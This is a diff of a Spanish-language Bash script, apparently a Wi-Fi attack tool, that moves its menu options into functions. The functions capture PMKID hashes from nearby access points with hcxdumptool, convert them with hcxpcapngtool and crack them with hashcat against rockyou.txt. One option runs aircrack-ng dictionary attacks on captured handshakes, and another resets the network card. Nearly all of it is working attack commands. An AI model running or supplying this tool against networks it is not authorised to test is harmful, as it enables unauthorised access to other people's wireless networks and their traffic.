@@ -83,10 +83,58 @@ handshake_ataque() {
 								fi
 }
 
+pkmid_ataque() {
+	clear
+	echo -e "\n${greenColour}[*] Iniciando ataque PKMID..\n"
+	sleep 1 
+	echo -e "${blueColour}[!] Recomendacion: 600 segundos (10 minutos)"
+	read -p "[?] Cuantos segundos quieres que dure la captura de los paquetes?: " seg
+	$cleancolor
+	xterm -hold -e "hcxdumptool -i ${tar}mon -o HashPKMID.pcapng --active_beacon --enable_status=15" & # --filtermode=2 --filterlist_ap= -c  Futura actualizacion
+	hcxcaptool_PID=$!
+	sleep ${seg}; kill -9 $hcxcaptool_PID; wait $hcxcaptool_PID 2>/dev/null
+    echo -e "\n${redColour} [%] Capturando Hashes\n"
+	sleep 2
+	$cleancolor
+	test -f HashPKMID*
+	if [ "$(echo $?)" == "0" ]; then
+		echo -e "\n${yellowColour}[*] Iniciando ataque de fuerza bruta"
+		sleep 1
+		tput cnorm
+		echo -e "\n${blueColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt${endColour}"
+		read -p "[?] Ruta del Diccionario al usar: " dicc1
+		tput civis; echo -e "\n${yellowColour}[*] Preparando el paquete para hacer fuerza bruta..."
+		hcxpcapngtool -o HPKMID.hc22000 -E essidlist HashPKMID.pcapng > /dev/null 2>&1
+		hashcat -m 22000 $dicc1 HPKMID.hc22000 -d 1 --force
+	else 
+	echo -e "\n${redColour}[!] No se pudo capturar el paquete necesario"
+	exit
+	fi
+}
 
+fuerza_ataque() {
+	clear
+	echo -e "\n${greenColour}[*] Iniciando Ataque de Fuerza Bruta"
+	sleep 1
+	echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
+	$cleancolor
+	tput cnorm
+	read -p "[?] Nombre del archivo .cap: " cap
+	tput civis; read -p "[?] Ruta del Diccionario al usar: " dicc
+	xterm -hold -e "aircrack-ng -w $dicc $cap"
+}
 
-
-
+salir() {
+	echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
+	airmon-ng stop ${tar}mon > /dev/null 2>&1
+	sudo /etc/init.d/networking start > /dev/null 2>&1
+	sudo /etc/init.d/networking restart > /dev/null 2>&1
+	sudo systemctl start NetworkManager > /dev/null 2>&1
+	ifconfig $tar up > /dev/null 2>&1
+	sudo rm Handshake* > /dev/null 2>&1
+	tput cnorm
+	exit
+}
 
 if [ $(id -u) -ne 0 ]; then
 	echo -e "$redColour\n[!] Debes ser root para ejecutar la herramienta -> (sudo $0)"
@@ -149,54 +197,13 @@ else
 								handshake_ataque
 								;;
 								2)
-								clear
-								echo -e "\n${greenColour}[*] Iniciando ataque PKMID..\n"
-								sleep 1 
-								echo -e "${blueColour}[!] Recomendacion: 600 segundos (10 minutos)"
-								read -p "[?] Cuantos segundos quieres que dure la captura de los paquetes?: " seg
-								$cleancolor
-								xterm -hold -e "hcxdumptool -i ${tar}mon -o HashPKMID.pcapng --active_beacon --enable_status=15" & # --filtermode=2 --filterlist_ap= -c  Futura actualizacion
-								hcxcaptool_PID=$!
-								sleep ${seg}; kill -9 $hcxcaptool_PID; wait $hcxcaptool_PID 2>/dev/null
-								echo -e "\n${redColour} [%] Capturando Hashes\n"
-								sleep 2
-								$cleancolor
-								test -f HashPKMID*
-								if [ "$(echo $?)" == "0" ]; then
-									echo -e "\n${yellowColour}[*] Iniciando ataque de fuerza bruta"
-									sleep 1
-									tput cnorm
-									echo -e "\n${blueColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt${endColour}"
-									read -p "[?] Ruta del Diccionario al usar: " dicc1
-									tput civis; echo -e "\n${yellowColour}[*] Preparando el paquete para hacer fuerza bruta..."
-									hcxpcapngtool -o HPKMID.hc22000 -E essidlist HashPKMID.pcapng > /dev/null 2>&1
-									hashcat -m 22000 $dicc1 HPKMID.hc22000 -d 1 --force
-								else 
-									echo -e "\n${redColour}[!] No se pudo capturar el paquete necesario"
-									exit
-								fi
+								pkmid_ataque
 								;;
 								3)
-								clear
-								echo -e "\n${greenColour}[*] Iniciando Ataque de Fuerza Bruta"
-								sleep 1
-								echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
-									$cleancolor
-									tput cnorm
-									read -p "[?] Nombre del archivo .cap: " cap
-									tput civis; read -p "[?] Ruta del Diccionario al usar: " dicc
-									xterm -hold -e "aircrack-ng -w $dicc $cap"
+								fuerza_ataque
 								;;
 								4)
-								echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
-								airmon-ng stop ${tar}mon > /dev/null 2>&1
-								sudo /etc/init.d/networking start > /dev/null 2>&1
-								sudo /etc/init.d/networking restart > /dev/null 2>&1
-								sudo systemctl start NetworkManager > /dev/null 2>&1
-								ifconfig $tar up > /dev/null 2>&1
-								sudo rm Handshake* > /dev/null 2>&1
-								tput cnorm
-								exit
+								salir
 								;;
 								*)
 								echo "Opción inválida"
